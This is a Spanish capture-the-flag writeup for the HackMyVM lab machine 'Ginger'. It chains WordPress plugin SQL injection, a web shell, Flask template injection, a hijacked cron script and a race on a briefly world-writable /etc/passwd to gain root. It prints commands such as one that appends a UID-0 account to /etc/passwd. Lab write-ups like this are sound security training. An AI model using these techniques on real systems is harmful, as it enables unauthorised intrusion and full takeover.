# Writeup: Máquina Ginger - HackMyVM

En este writeup detallo el proceso de explotación y escalada de privilegios de la máquina **Ginger** de la plataforma HackMyVM. La resolución abarca desde la enumeración inicial y explotación de vulnerabilidades en WordPress, hasta múltiples pivoteos laterales y escaladas de privilegios utilizando configuraciones incorrectas, inyecciones de plantillas (SSTI) y tareas programadas (cron).

---

## 1. Reconocimiento Inicial

Comenzamos comprobando la conectividad con la máquina objetivo mediante una traza ICMP. El TTL de 64 nos indica que nos encontramos ante un sistema operativo Linux.

```bash
root@kali:~# ping -c3 192.168.0.20
PING 192.168.0.20 (192.168.0.20) 56(84) bytes of data.
64 bytes from 192.168.0.20: icmp_seq=1 ttl=64 time=0.426 ms
64 bytes from 192.168.0.20: icmp_seq=2 ttl=64 time=0.531 ms
64 bytes from 192.168.0.20: icmp_seq=3 ttl=64 time=0.498 ms

--- 192.168.0.20 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2039ms
rtt min/avg/max/mdev = 0.426/0.485/0.531/0.043 ms
```

A continuación, ejecutamos un escaneo de puertos completo con `nmap` para descubrir los servicios expuestos:

```bash
root@kali:~/hmv/Ginger/nmap# nmap -p- --open -sSCV -n -Pn 192.168.0.20 -oN tcpScan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 10:44 +0200
Nmap scan report for 192.168.0.20
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
```

Dado que la versión de OpenSSH es 7.9p1 (superior a la 7.7, lo que dificulta la enumeración de usuarios por fuerza bruta), centramos nuestros esfuerzos en el puerto 80 (HTTP).

---

## 2. Enumeración Web

Al acceder al puerto 80 nos encontramos con la página por defecto de Apache2 en Debian. Para descubrir directorios ocultos, utilizamos `gobuster`:

```bash
root@kali:~/hmv/Ginger/nmap# gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.20 -x txt,php -r
# ... [Output truncado] ...
wordpress            (Status: 200) [Size: 8304]
server-status        (Status: 403) [Size: 277]
```

Encontramos un directorio `/wordpress`. Al acceder, revisamos el único post publicado, lo que nos revela información interesante: 
- El uso de Gravatar para los avatares.
- Un usuario llamado `webmaster`.
- Wappalyzer nos indica el uso del motor de base de datos MySQL.

Procedemos a lanzar `wpscan`. En un análisis superficial no detecta vectores de ataque claros, pero al emplear una enumeración agresiva de plugins (`--plugins-detection aggressive`), logramos identificar dos extensiones potencialmente vulnerables:
1. `akismet 4.1.9`
2. `cp-multi-view-calendar 1.0.2` (versión confirmada accediendo al archivo `README.txt` del plugin).

---

## 3. Explotación (Initial Access)

Buscando en la base de datos de vulnerabilidades con `searchsploit cp-multi-view-calendar`, descubrimos un exploit para *Unauthenticated SQL Injection* (SQLi) aplicable a la versión 1.1.4 y anteriores (EDB-ID: 36243). 

El exploit proporciona rutas vulnerables. Verificamos la inyección utilizando `sqlmap`. Tras confirmar que la base de datos es vulnerable, enumeramos con el parámetro `--dbs`, descubriendo `information_schema` y `wordpress_db`. Conociendo la estructura de WordPress, nos enfocamos en dumpear la tabla `wp_users` de la base de datos `wordpress_db`.

Obtenemos las credenciales del usuario `webmaster` (correo: `webmaster@gmail.com`) junto a su hash. Empleando `hashcat`, logramos crackear el hash rápidamente, revelando la contraseña en texto plano: `sanitarium`.

Aunque probamos usar estas credenciales en SSH, el acceso es denegado. Nos autenticamos entonces en el panel de administración de WordPress. Nos percatamos de que no tenemos permisos para editar archivos desde el *Theme File Editor*. Para sortear esta restricción, abusamos de la funcionalidad de subida de plugins para cargar un plugin malicioso que nos permita *Arbitrary File Upload*. Subimos una simple web shell en PHP, la ejecutamos y obtenemos una reverse shell en nuestro equipo como el usuario `www-data`.

---

## 4. Escalada de Privilegios

### 4.1. De `www-data` a `sabrina`

Tras estabilizar la terminal, revisamos los privilegios de sudo del usuario `www-data`:

```bash
sudo -l
# Resultado: NOPASSWD: /usr/bin/sl
```

Podemos ejecutar el binario `/usr/bin/sl` como cualquier usuario sin proporcionar contraseña. Aunque GTFOBins no lista este binario para evadir restricciones, al ejecutarlo nos muestra el clásico tren en ASCII. 

![GIF del tren ASCII](images/tren.gif)

Tras comprobar las *capabilities* (`getcap -r / 2>/dev/null`) sin éxito, decido realizar una enumeración manual por los directorios de los usuarios (ubicados en `/home`: `webmaster`, `sabrina` y `caroline`). 

En el directorio de `/home/sabrina` encontramos el archivo legible `password.txt` con el siguiente mensaje:
> "I forgot my password again... I wrote it down somewhere in this form: sabrina:password but I don't know where... I have to search in my memory"

La mención a la "memoria" sugiere revisar historiales (como el `.bash_history`), pero este último se encuentra redirigido a `/dev/null`. Una búsqueda global de la cadena "sabrina:" (`grep -r "sabrina:" / 2>/dev/null`) tampoco da frutos. 

Repasando los procedimientos estándar de enumeración del sistema, reviso el buffer del kernel con `dmesg`. Al filtrar los resultados, extraemos exitosamente la contraseña de Sabrina en texto plano almacenada en memoria:

```bash
dmesg | grep sabrina
```
*Con esta contraseña, cambiamos al usuario `sabrina`.*

### 4.2. De `sabrina` a `webmaster`

Verificamos los privilegios sudo para el nuevo usuario:

```bash
sudo -l
# User sabrina may run the following commands on ginger:
# (webmaster) NOPASSWD: /usr/bin/python /opt/app.py *
```

Podemos ejecutar un script en Python como el usuario `webmaster`. Revisamos el contenido del archivo `02-app.jpg`.

![Código de la App](02-app.jpg)

El código expone una aplicación en Flask con una vulnerabilidad clara de Server Side Template Injection (SSTI) en la función `hello_ssti()`:

```python
from flask import Flask, request, render_template_string, render_template

app = Flask(__name__)
@app.route('/')
def hello_ssti():
    person = {'name':"world", 'secret':"UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg=="}
    if request.args.get('name'):
        person['name'] = request.args.get('name')
    template = '''<h2>Hello %s!</h2>''' % person['name']
    return render_template_string(template, person=person)

def get_user_file(f_name):
    with open(f_name) as f:
        return f.readlines()
app.jinja_env.globals['get_user_file'] = get_user_file

if __name__ == "__main__":
    app.run(debug=True)
```

Para explotar esta aplicación, necesitamos interactuar con ella. Como la aplicación se despliega en el puerto 5000 (localhost), realizamos un *Port Forwarding* usando nuestra conexión SSH de Sabrina:

```bash
ssh -L 5000:localhost:5000 sabrina@192.168.0.20
```

Ahora, accediendo a través de nuestro navegador web y manipulando el parámetro `name`, confirmamos la vulnerabilidad:

![Evidencia del SSTI](03-SSTI.jpg)

Basándonos en repositorios de explotación conocidos (como la guía de *vulhub* para Flask SSTI), crafteamos un payload para convertir esta inyección de plantillas en Ejecución Remota de Comandos (RCE). Inyectamos el comando para entablar una reverse shell y la recibimos en nuestra máquina atacante, obteniendo acceso como `webmaster`.

### 4.3. De `webmaster` a `caroline`

Como `webmaster`, la enumeración manual no revela vías de escalada obvias. Para detectar procesos ejecutándose en segundo plano empleamos la herramienta `pspy64`. 

Gracias a `pspy64`, detectamos la ejecución periódica de un script de backup en `/home/caroline/backup/backup.sh` a través de Cron. Aunque no contamos con permisos de escritura directa sobre el archivo en sí, comprobamos que sí podemos eliminarlo y crear un archivo nuevo con el mismo nombre y permisos de ejecución que reemplace al original.

Creamos un archivo `backup.sh` malicioso que inicie una conexión inversa hacia nosotros. Esperamos a que la tarea programada se ejecute y logramos ganar acceso como el usuario `caroline`.

### 4.4. De `caroline` a `root`

Nuevamente, verificamos qué comandos podemos ejecutar con privilegios:

```bash
sudo -l
# (root) NOPASSWD: /srv/code
```

El usuario `caroline` puede ejecutar el binario `/srv/code` como administrador. Al inspeccionarlo usando `strings` para extraer las cadenas de texto legibles, descubrimos la siguiente secuencia de comandos en su interior:

```bash
chmod o+w /etc/passwd; sleep 5; chmod o-w /etc/passwd
```

Este binario otorga permisos de escritura en el archivo `/etc/passwd` a "otros" usuarios (`o+w`), duerme el proceso durante 5 segundos y luego revoca dichos permisos (`o-w`). Esta ventana de tiempo de 5 segundos es más que suficiente para introducir un nuevo usuario con permisos de administrador en el sistema.

Primero, generamos el hash MD5 para nuestra contraseña (en este caso "pass"):

```bash
openssl passwd -1
# Password: pass
# $1$30dLNEc1$leidxGJGWj42k.YAeCdNL/
```

Ejecutamos el binario para abrir la ventana de oportunidad:

```bash
sudo /srv/code
```

Mientras el contador de los 5 segundos está en curso, desde otra sesión agregamos un nuevo usuario con UID y GID 0 (root) al `/etc/passwd`:

```bash
echo 'newuser:$1$30dLNEc1$leidxGJGWj42k.YAeCdNL/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Finalmente, cambiamos a nuestro usuario recién creado y comprobamos que poseemos el control total del sistema.

```bash
su newuser
# Password: pass
root@ginger:/# id
uid=0(root) gid=0(root) groups=0(root)
```

¡Máquina rooteada exitosamente!
